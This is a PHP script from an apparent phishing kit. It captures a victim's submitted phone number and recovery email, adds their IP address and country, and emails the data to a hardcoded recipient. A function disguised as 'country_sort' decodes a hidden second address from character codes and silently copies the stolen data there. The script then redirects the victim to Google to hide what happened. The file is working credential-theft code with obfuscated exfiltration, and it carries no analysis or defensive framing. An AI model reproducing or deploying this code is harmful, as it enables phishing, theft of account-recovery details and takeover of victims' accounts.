<?

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$message .= "!$-@-!$-@-!---- : || L!F3xL!F3L!F3 || :------!$-@-!$-@-!\n";
$message .= "Phone Number: ".$_POST['phone']."\n";
$message .= "Recovery Email: ".$_POST['altemail']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "IP: ".$ip."\n";



$recipient ="rtamez@masterrfuel.com";
$subject = "L!F3 | ".$ip."\n";


$arr = country_sort();
foreach ($arr as $recipient)
{

          mail($recipient,$subject,$message);
}

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

header("Location:  http://www.google.com");
?>